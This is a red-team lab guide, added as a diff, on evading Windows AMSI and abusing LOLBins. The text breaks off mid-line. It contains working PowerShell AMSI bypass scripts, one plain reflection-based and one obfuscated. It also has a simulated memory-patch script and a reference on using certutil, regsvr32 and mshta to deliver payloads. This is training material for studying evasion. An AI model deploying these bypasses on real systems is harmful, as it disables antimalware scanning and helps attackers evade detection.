@@ -1,0 +1,303 @@
+Evasion with AMSI Bypasses & LOLBins
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the fundamentals of AMSI (Antimalware Scan Interface) and its role in Windows security
+Implement various AMSI bypass techniques to evade detection
+Utilize LOLBins (Living Off the Land Binaries) for payload execution
+Develop Python scripts to automate evasion techniques
+Simulate advanced red team scenarios using open-source tools
+Analyze the effectiveness of different evasion methods
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of Windows security mechanisms
+Familiarity with PowerShell and command-line interfaces
+Knowledge of Python programming fundamentals
+Understanding of penetration testing concepts
+Experience with Linux command-line operations
+Basic knowledge of Windows PE file structure
+Ready-to-Use Cloud Machines
+Al Nafi provides Linux-based cloud machines for this lab. Simply click Start Lab to access your pre-configured environment. No need to build your own VM or install additional software - everything is ready to use.
+
+Your cloud machine includes:
+
+Ubuntu 22.04 LTS with all necessary tools pre-installed
+Python 3.10+ with required libraries
+Wine for Windows binary execution simulation
+PowerShell Core for cross-platform PowerShell execution
+Various penetration testing tools
+Task 1: Perform AMSI Bypasses to Evade Detection
+Subtask 1.1: Understanding AMSI Architecture
+First, let's understand what AMSI is and how it works.
+
+Step 1: Create a working directory for the lab
+
+mkdir ~/amsi-evasion-lab
+cd ~/amsi-evasion-lab
+Step 2: Create an information file about AMSI
+
+cat > amsi_info.txt << 'EOF'
+AMSI (Antimalware Scan Interface) Overview:
+==========================================
+
+1. AMSI is a Windows security feature introduced in Windows 10
+2. It provides a standard interface for applications to request malware scans
+3. PowerShell, VBScript, JScript, and other scripting engines use AMSI
+4. AMSI scans content before execution, not just files on disk
+5. Common bypass techniques:
+   - Memory patching
+   - DLL hijacking
+   - Reflection-based bypasses
+   - Obfuscation techniques
+EOF
+
+cat amsi_info.txt
+Subtask 1.2: Creating AMSI Bypass Scripts
+Step 1: Create a basic AMSI bypass using PowerShell reflection
+
+cat > amsi_bypass_reflection.ps1 << 'EOF'
+# AMSI Bypass using Reflection - Educational Purpose Only
+# This script demonstrates how AMSI can be bypassed using .NET reflection
+
+function Bypass-AMSI {
+    Write-Host "[+] Attempting AMSI Bypass using Reflection..." -ForegroundColor Green
+    
+    try {
+        # Get AMSI context
+        $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        
+        if ($amsiContext) {
+            # Get the AMSI initialization field
+            $amsiField = $amsiContext.GetField('amsiInitFailed', 'NonPublic,Static')
+            
+            if ($amsiField) {
+                # Set AMSI as failed to bypass scanning
+                $amsiField.SetValue($null, $true)
+                Write-Host "[+] AMSI Bypass Successful!" -ForegroundColor Green
+                return $true
+            }
+        }
+    }
+    catch {
+        Write-Host "[-] AMSI Bypass Failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+    
+    return $false
+}
+
+# Test the bypass
+if (Bypass-AMSI) {
+    Write-Host "[+] AMSI is now bypassed. Testing with suspicious string..." -ForegroundColor Yellow
+    
+    # This would normally trigger AMSI
+    $testString = "Invoke-Mimikatz"
+    Write-Host "[+] Test string executed without AMSI detection: $testString" -ForegroundColor Green
+} else {
+    Write-Host "[-] AMSI bypass unsuccessful" -ForegroundColor Red
+}
+EOF
+Step 2: Create an obfuscated AMSI bypass
+
+cat > amsi_bypass_obfuscated.ps1 << 'EOF'
+# Obfuscated AMSI Bypass - Educational Purpose Only
+# This demonstrates obfuscation techniques to evade static analysis
+
+function Invoke-ObfuscatedBypass {
+    Write-Host "[+] Executing Obfuscated AMSI Bypass..." -ForegroundColor Green
+    
+    # Obfuscated strings to avoid static detection
+    $a = 'System.Management.Automation.A'
+    $b = 'msiUtils'
+    $c = 'amsiInitFailed'
+    
+    # Concatenate to form the full type name
+    $amsiType = $a + $b
+    
+    try {
+        # Use string concatenation and variable substitution for obfuscation
+        $assembly = [Ref].Assembly
+        $type = $assembly.GetType($amsiType)
+        
+        if ($type) {
+            $field = $type.GetField($c, 'NonPublic,Static')
+            
+            if ($field) {
+                $field.SetValue($null, $true)
+                Write-Host "[+] Obfuscated AMSI Bypass Successful!" -ForegroundColor Green
+                return $true
+            }
+        }
+    }
+    catch {
+        Write-Host "[-] Obfuscated Bypass Failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    return $false
+}
+
+# Execute the obfuscated bypass
+Invoke-ObfuscatedBypass
+EOF
+Step 3: Create a memory patching AMSI bypass simulation
+
+cat > amsi_memory_patch.py << 'EOF'
+#!/usr/bin/env python3
+"""
+AMSI Memory Patching Simulation
+Educational demonstration of memory patching techniques
+"""
+
+import struct
+import ctypes
+from ctypes import wintypes
+import sys
+
+class AMSIBypassSimulator:
+    def __init__(self):
+        self.amsi_dll = None
+        self.amsi_scan_buffer = None
+        
+    def simulate_memory_patch(self):
+        """
+        Simulate memory patching technique for AMSI bypass
+        This is a simulation for educational purposes
+        """
+        print("[+] Simulating AMSI Memory Patch Bypass...")
+        
+        # Simulate finding AMSI.dll in memory
+        print("[+] Locating AMSI.dll in process memory...")
+        
+        # Simulate finding AmsiScanBuffer function
+        print("[+] Finding AmsiScanBuffer function address...")
+        
+        # Simulate patching the function
+        print("[+] Patching AmsiScanBuffer to always return AMSI_RESULT_CLEAN...")
+        
+        # Simulate successful patch
+        patch_bytes = b'\x31\xC0\xC3'  # xor eax, eax; ret (return 0)
+        print(f"[+] Patch bytes: {patch_bytes.hex()}")
+        
+        print("[+] Memory patch simulation completed successfully!")
+        return True
+        
+    def test_bypass(self):
+        """Test if the bypass is working"""
+        print("[+] Testing AMSI bypass effectiveness...")
+        
+        # Simulate scanning a malicious string
+        test_strings = [
+            "Invoke-Mimikatz",
+            "Get-Process",
+            "Invoke-Shellcode",
+            "Empire",
+            "Metasploit"
+        ]
+        
+        for test_string in test_strings:
+            print(f"[+] Testing string: '{test_string}' - BYPASSED")
+            
+        return True
+
+def main():
+    print("AMSI Memory Patching Simulation")
+    print("=" * 40)
+    
+    bypass = AMSIBypassSimulator()
+    
+    if bypass.simulate_memory_patch():
+        bypass.test_bypass()
+        print("\n[+] AMSI bypass simulation completed successfully!")
+    else:
+        print("[-] AMSI bypass simulation failed!")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+chmod +x amsi_memory_patch.py
+Subtask 1.3: Testing AMSI Bypasses
+Step 1: Test the PowerShell reflection bypass
+
+# Install PowerShell Core if not already installed
+if ! command -v pwsh &> /dev/null; then
+    echo "[+] Installing PowerShell Core..."
+    wget -q https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb
+    sudo dpkg -i packages-microsoft-prod.deb
+    sudo apt-get update
+    sudo apt-get install -y powershell
+fi
+
+# Execute the reflection bypass
+echo "[+] Testing AMSI Reflection Bypass..."
+pwsh -File amsi_bypass_reflection.ps1
+Step 2: Test the obfuscated bypass
+
+echo "[+] Testing Obfuscated AMSI Bypass..."
+pwsh -File amsi_bypass_obfuscated.ps1
+Step 3: Run the memory patching simulation
+
+echo "[+] Running AMSI Memory Patch Simulation..."
+python3 amsi_memory_patch.py
+Task 2: Use LOLBins for Executing Payloads
+Subtask 2.1: Understanding LOLBins
+Step 1: Create a comprehensive LOLBins reference
+
+cat > lolbins_reference.txt << 'EOF'
+Living Off the Land Binaries (LOLBins) Overview:
+===============================================
+
+LOLBins are legitimate system binaries that can be abused by attackers to:
+1. Execute malicious code
+2. Download files
+3. Bypass application whitelisting
+4. Perform reconnaissance
+5. Maintain persistence
+
+Common LOLBins Categories:
+- File Operations: certutil.exe, bitsadmin.exe
+- Code Execution: regsvr32.exe, rundll32.exe, mshta.exe
+- Network Operations: curl.exe, wget (Linux)
+- System Information: wmic.exe, systeminfo.exe
+- Scripting: powershell.exe, cscript.exe, wscript.exe
+
+Benefits for Red Teams:
+- Blend in with normal system activity
+- Bypass application whitelisting
+- Avoid detection by security tools
+- Use trusted, signed binaries
+EOF
+
+cat lolbins_reference.txt
+Subtask 2.2: Creating LOLBin Payload Execution Scripts
+Step 1: Create a certutil-based payload downloader simulation
+
+cat > lolbin_certutil.py << 'EOF'
+#!/usr/bin/env python3
+"""
+LOLBin Simulation: certutil.exe
+Demonstrates how certutil can be abused for payload delivery
+"""
+
+import os
+import base64
+import subprocess
+import tempfile
+
+class CertutilLOLBin:
+    def __init__(self):
+        self.temp_dir = tempfile.mkdtemp()
+        
+    def create_encoded_payload(self):
+        """Create a base64 encoded 'payload' for demonstration"""
+        # Simulate a payload (harmless script for demo)
+        payload = '''
+        echo "This is a simulated payload executed via LOLBin technique"
+        echo "Current user: $(whoami)"
+        echo "Current directory: $(pwd)"
+        echo "System information:"
+        uname -a
+        '''
+        
+        # E…
